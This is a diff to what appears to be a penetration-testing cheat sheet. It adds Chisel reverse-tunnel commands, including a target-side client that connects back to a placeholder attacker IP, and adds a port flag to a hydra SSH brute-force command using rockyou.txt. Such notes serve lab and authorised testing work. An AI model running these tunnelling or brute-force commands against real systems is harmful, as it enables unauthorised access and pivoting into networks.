@@ -156,6 +156,26 @@ ss -tulpn
 ssh -L <PORT>:localhost:<PORT> <USER_NAME>@<TARGET_IP>
 ```
 
+### Chisel for Port Forwarding and Tunneling
+
+Download:
+
+```bash
+wget https://github.com/jpillora/chisel/releases/latest/download/chisel_<VERSION>_linux_amd64.gz
+```
+
+Attacker machine (server):
+
+```bash
+./chisel server --reverse --port 9002
+```
+
+Target machine (client):
+
+```bash
+./chisel client <ATTACKER_IP>:9002 R:<LOCAL_PORT>:<TARGET_IP>:<REMOTE_PORT>
+```
+
 # Windows Privilege Escalation and System Commands
 
 ## Privilege and Permission Analysis
@@ -223,7 +243,7 @@ john -w=initial-list --rules --stdout > password-list
 ## Network Service Brute Force Attacks
 
 ```bash
-hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt -s <PORT> ssh://<TARGET_IP>
 ```
 
 ```bash
